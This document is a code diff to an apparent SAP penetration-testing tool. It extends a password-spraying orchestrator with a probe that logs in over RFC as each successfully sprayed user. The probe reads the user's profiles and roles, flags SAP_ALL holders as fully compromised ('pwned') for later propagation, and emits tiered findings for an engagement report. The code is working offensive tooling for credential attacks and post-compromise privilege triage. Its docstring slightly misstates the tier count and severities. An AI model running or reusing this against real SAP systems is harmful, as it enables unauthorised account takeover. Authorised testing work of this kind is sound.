@@ -899,6 +899,7 @@ def spray_landscape(
     on_attempt: Optional[Callable[[SprayAttempt], None]] = None,
     usr02_probe_fn: Optional[Callable] = None,
     purple_report_fn: Optional[Callable] = None,
+    hit_authority_probe_fn: Optional[Callable] = None,
 ) -> SprayRun:
     """Orchestrator — sequential outer target loop, inner spray engine
     per (target × clients × candidates).  Consults the landscape-wide
@@ -1220,6 +1221,128 @@ def spray_landscape(
                     username=row["user"], password=row["password"],
                     client=row["client"], instance_nr="",
                     verified=True, kind="spray"))
+                # Post-hit authority probe (issue #69, PR5-de-gate /
+                # Option B).  Classifies the credential's authority
+                # into one of three tiers; sap_all upgrades
+                # node.pwned=True, the others leave pwned alone so
+                # phase4_propagate doesn't waste SU01 BAPIs on a
+                # dialog-only user.  Probe is injectable so tests
+                # can run without pyrfc.
+                _probe = (hit_authority_probe_fn
+                          or _default_hit_authority_probe)
+                try:
+                    _auth = _probe(
+                        node, row.get("client"),
+                        row.get("user"), row.get("password"))
+                except Exception as _e:
+                    _auth = {
+                        "authority_level": "probe_failed",
+                        "profiles": [], "roles": [],
+                        "note": f"probe raised: {_e}",
+                    }
+                _tier = _auth.get("authority_level", "probe_failed")
+                _hit_user_entry = {
+                    "run_id": config.run_id,
+                    "ts": datetime.utcnow().isoformat(),
+                    "client": row.get("client", ""),
+                    "user": row.get("user", ""),
+                    "source_kind": row.get("source_kind", ""),
+                    "source_sid": row.get("source_sid", ""),
+                    "pw_sha256_prefix": row.get("pw_sha256_prefix", ""),
+                    "authority_level": _tier,
+                    "profiles": list(_auth.get("profiles", []) or []),
+                    "roles": list(_auth.get("roles", []) or []),
+                    "note": _auth.get("note", ""),
+                }
+                if node.spray_hit_users is None:
+                    node.spray_hit_users = []
+                node.spray_hit_users.append(_hit_user_entry)
+                # Per-hit finding tiered by authority so the ATT&CK
+                # heatmap + engagement report reflect actual blast
+                # radius.  sap_all → CRITICAL + node.pwned=True;
+                # privileged → HIGH; unprivileged → MEDIUM; probe
+                # failed → MEDIUM with note.  Lazy-import to avoid
+                # a sapmap_findings → sapmap_pwspray cycle.
+                try:
+                    from sapmap_findings import emit_finding
+                except Exception:
+                    emit_finding = None   # noqa: N806
+                _hit_msg_prefix = (
+                    f"Spray hit {row.get('user')}@{target.sid}/"
+                    f"{row.get('client')}")
+                if _tier == "sap_all":
+                    node.pwned = True
+                    _append_log(
+                        f"HIT auth: SAP_ALL on {target.sid}/"
+                        f"{row.get('client')} user={row.get('user')} "
+                        f"→ node.pwned=True")
+                    try:
+                        if emit_finding is None:
+                            raise RuntimeError("emit_finding unavailable")
+                        emit_finding(
+                            "CRITICAL", target.sid,
+                            (f"{_hit_msg_prefix} — "
+                             f"**SAP_ALL** ({_auth.get('note', '')})"),
+                            ref="pwspray.hit.sap_all",
+                            attack_capability="creds.password_spray")
+                    except Exception:
+                        pass
+                elif _tier == "privileged":
+                    _append_log(
+                        f"HIT auth: privileged on {target.sid}/"
+                        f"{row.get('client')} user={row.get('user')} "
+                        f"(profiles={len(_hit_user_entry['profiles'])}, "
+                        f"roles={len(_hit_user_entry['roles'])})")
+                    try:
+                        if emit_finding is None:
+                            raise RuntimeError("emit_finding unavailable")
+                        emit_finding(
+                            "HIGH", target.sid,
+                            (f"{_hit_msg_prefix} — privileged "
+                             f"({len(_hit_user_entry['profiles'])} "
+                             f"profile(s), "
+                             f"{len(_hit_user_entry['roles'])} "
+                             f"role(s); SAP_ALL NOT observed)"),
+                            ref="pwspray.hit.privileged",
+                            attack_capability=(
+                                "creds.password_reuse_cross_system"
+                                if row.get("source_sid")
+                                else "creds.password_spray"))
+                    except Exception:
+                        pass
+                elif _tier == "unprivileged":
+                    _append_log(
+                        f"HIT auth: unprivileged on {target.sid}/"
+                        f"{row.get('client')} user={row.get('user')} "
+                        f"(no profiles, no roles)")
+                    try:
+                        if emit_finding is None:
+                            raise RuntimeError("emit_finding unavailable")
+                        emit_finding(
+                            "MEDIUM", target.sid,
+                            (f"{_hit_msg_prefix} — logon works "
+                             f"but user carries no profiles / roles "
+                             f"(dialog or service account)"),
+                            ref="pwspray.hit.unprivileged",
+                            attack_capability="creds.password_spray")
+                    except Exception:
+                        pass
+                else:   # probe_failed
+                    _append_log(
+                        f"HIT auth: probe_failed on {target.sid}/"
+                        f"{row.get('client')} user={row.get('user')} "
+                        f"— {_auth.get('note', '')}")
+                    try:
+                        if emit_finding is None:
+                            raise RuntimeError("emit_finding unavailable")
+                        emit_finding(
+                            "MEDIUM", target.sid,
+                            (f"{_hit_msg_prefix} — authority probe "
+                             f"failed ({_auth.get('note', '')})"),
+                            ref="pwspray.hit.probe_failed",
+                            attack_capability="creds.password_spray")
+                    except Exception:
+                        pass
                 # Persist counter so a crash-restart doesn't re-burn
                 # budget on this (sid, client, user) triple.
                 counter_key = (
@@ -1452,6 +1575,136 @@ def _md_escape_cell(value) -> str:
     for bad in ("|", "\n", "\r", "\\", "`"):
         s = s.replace(bad, "")
     return s
+
+
+# SAP_ALL profile aliases.  Match the set that
+# sapmap_exploit._user_has_sap_all treats as a hit.
+_SAP_ALL_ALIASES = {"SAP_ALL", "ALL_AUTHORIZATIONS_PROF", "S_A.SYSTEM"}
+
+
+def _default_hit_authority_probe(node, client, user, password):
+    """Default post-hit authority probe (issue #69, PR5-de-gate).
+
+    Opens an RFC connection AS the sprayed user (not as the operator)
+    and classifies the authority the credential grants into one of
+    three tiers:
+
+      - ``sap_all``       — PROFILES or ACTIVITYGROUPS carries SAP_ALL
+                             (or an alias): the hit fully owns the box.
+                             Caller should set ``node.pwned=True`` and
+                             emit a CRITICAL finding.
+      - ``privileged``    — probe succeeded, user has at least one
+                             profile OR role, but nothing matched the
+                             SAP_ALL set: working logon with
+                             authorizations we haven't verified as
+                             propagation-grade.  Caller emits HIGH.
+      - ``unprivileged``  — probe succeeded, user has zero profiles
+                             AND zero roles: dialog/service user with
+                             no authorizations.  Caller emits INFO.
+      - ``probe_failed``  — RFC connection failed OR BAPI/UST04 both
+                             raised: cannot classify (common on hardened
+                             targets that refuse RFC without extra
+                             auth).  Caller emits INFO + note.
+
+    Returns ``{"authority_level": str, "profiles": list[str],
+              "roles": list[str], "note": str}``.
+
+    Injectable via ``spray_landscape(hit_authority_probe_fn=...)`` so
+    tests don't need pyrfc.
+    """
+    try:
+        import sapmap_rfc
+    except Exception as e:
+        return {
+            "authority_level": "probe_failed",
+            "profiles": [], "roles": [],
+            "note": f"sapmap_rfc not importable: {e}",
+        }
+    try:
+        from sapmap_models import Credentials
+    except Exception as e:
+        return {
+            "authority_level": "probe_failed",
+            "profiles": [], "roles": [],
+            "note": f"Credentials class not importable: {e}",
+        }
+    # Build a Credentials object as the SPRAYED user so the RFC
+    # handshake uses the exact credential the hit confirmed works.
+    try:
+        instance_nr = (
+            node.instance_nrs()[0]
+            if callable(getattr(node, "instance_nrs", None))
+            and node.instance_nrs()
+            else "00")
+    except Exception:
+        instance_nr = "00"
+    hit_creds = Credentials(
+        username=user,
+        password=password,
+        client=client,
+        instance_nr=instance_nr,
+        verified=True,
+        kind="spray",
+    )
+    profiles: List[str] = []
+    roles: List[str] = []
+    try:
+        with sapmap_rfc._get_connection(node, hit_creds) as conn:
+            try:
+                det = conn.call(
+                    "BAPI_USER_GET_DETAIL",
+                    USERNAME=user,
+                    CACHE_RESULTS=" ",
+                )
+            except Exception as e:
+                return {
+                    "authority_level": "probe_failed",
+                    "profiles": [], "roles": [],
+                    "note": f"BAPI_USER_GET_DETAIL raised: {e}",
+                }
+            for p in (det.get("PROFILES", []) or []):
+                prof = ((p.get("BAPIPROF") or p.get("PROFILE") or "")
+                        or "").strip()
+                if prof:
+                    profiles.append(prof)
+                if prof in _SAP_ALL_ALIASES:
+                    return {
+                        "authority_level": "sap_all",
+                        "profiles": profiles,
+                        "roles": roles,
+                        "note": f"PROFILES carries {prof}",
+                    }
+            for a in (det.get("ACTIVITYGROUPS", []) or []):
+                role = ((a.get("AGR_NAME") or a.get("ROLE") or "")
+                        or "").strip()
+                if role:
+                    roles.append(role)
+                if role == "SAP_ALL":
+                    return {
+                        "authority_level": "sap_all",
+                        "profiles": profiles,
+                        "roles": roles,
+                        "note": "ACTIVITYGROUPS carries SAP_ALL",
+                    }
+    except Exception as e:
+        return {
+            "authority_level": "probe_failed",
+            "profiles": [], "roles": [],
+            "note": f"RFC connect/probe raised: {e}",
+        }
+    if profiles or roles:
+        return {
+            "authority_level": "privileged",
+            "profiles": profiles,
+            "roles": roles,
+            "note": (f"{len(profiles)} profile(s), "
+                     f"{len(roles)} role(s) — no SAP_ALL match"),
+        }
+    return {
+        "authority_level": "unprivileged",
+        "profiles": [], "roles": [],
+        "note": "BAPI_USER_GET_DETAIL returned no profiles or roles",
+    }
 
 
 def _default_usr02_probe(node, creds, client, users):
